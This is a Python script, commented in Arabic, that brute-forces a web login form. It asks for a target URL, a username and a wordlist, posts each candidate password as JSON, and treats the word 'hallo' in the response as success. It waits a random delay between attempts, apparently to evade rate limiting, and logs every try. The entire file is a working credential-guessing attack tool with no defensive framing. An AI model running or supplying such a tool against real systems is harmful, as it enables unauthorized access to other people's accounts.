import requests
import time
import random

namber = {0.1,0.2,0.3,0.4,0.5,0.6,0.7,0.8,0.9,1,1.1,1.2,1.3,1.4,1.5,1.6,1.7,1.8,1.9,2,2.1,2.2} 
#random_choice = random.choice(list(namber)) # اختيار عشوائي من المجموعة 


# رابط صفحة تسجيل الدخول
url = input("Enter the target URL (e.g., http://example.com/login.php): ")

#"http://testnano.wuaze.com/login.php"

# اسم المستخدم الذي تريد تجربة كلمات المرور له
username = input("Enter the username to brute-force: ")

# ملف كلمات المرور المحتملة
wordlist_file = input("Enter the path to the wordlist file: ")









# قراءة مع معالجة للأخطاء وترميز محدد
try:
    with open(wordlist_file, "r", encoding="utf-8") as f:
        passwords = [line.strip() for line in f if line.strip()] # تجاهل الأسطر الفارغة 
except FileNotFoundError: # التعامل مع خطأ عدم وجود الملف   
    print("The file was not found. please confirm the file: ", wordlist_file) # طباعة رسالة الخطأ
    exit(1) # إنهاء البرنامج مع رمز خطأ 1   


total = len(passwords) # إجمالي عدد كلمات المرور في القائمة 







for idx, pwd in enumerate(passwords, start=1):
    if not username or not pwd:
        print("[ERROR] Username or password is empty. Skipping this attempt.")
        continue

    data = {"username": username, "password": pwd}
    headers = {'Content-Type': 'application/json'}

    try:
        response = requests.post(url, json=data, headers=headers, timeout=10)
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] Request failed: {e}")
        continue

    if "hallo" in response.text:
        print(f"[SUCCESS] Attempt {idx}: Correct password is '{pwd}'")
        break
    else:
        print(f"[FAIL] Attempt {idx}: Tried password '{pwd}'")

    delay = random.choice(list(namber))
    print(f"[INFO] Waiting for {delay} seconds before next attempt...")
    time.sleep(delay)
    with open("results.log", "a", encoding="utf-8") as log_file:
        if "hallo" in response.text:
            log_file.write(f"[SUCCESS] Username: {username}, Password: {pwd}\n")
        else:
            log_file.write(f"[FAIL] Username: {username}, Password: {pwd}\n")

    progress = (idx / total) * 100
    print(f"[PROGRESS] {progress:.2f}% completed")
